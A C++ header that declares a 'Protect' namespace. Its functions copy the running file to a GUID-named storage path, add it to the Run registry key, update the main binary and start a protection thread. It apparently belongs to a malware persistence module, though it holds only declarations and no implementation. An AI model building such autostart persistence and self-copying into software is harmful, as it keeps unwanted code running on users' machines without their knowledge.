#ifndef _PROTECT_H_
#define _PROTECT_H_

namespace Protect
{
	BOOLEAN UpdateMain(PVOID Buffer, DWORD Size);
	VOID GetFileNameFromGuid(PCHAR Guid, PCHAR Name);
	VOID GetNewPath(PCHAR Path, PCHAR Ext);
	VOID GetStorageFolderPath(PCHAR Path);
	BOOLEAN AddKeyToRun(PCHAR NewFilePath);
	BOOLEAN WriteFileToNewPath(PCHAR CurrentFilePath, PCHAR NewFileName);
	VOID StartProtect();
	DWORD ProtectThread(PVOID Context);
};

#endif
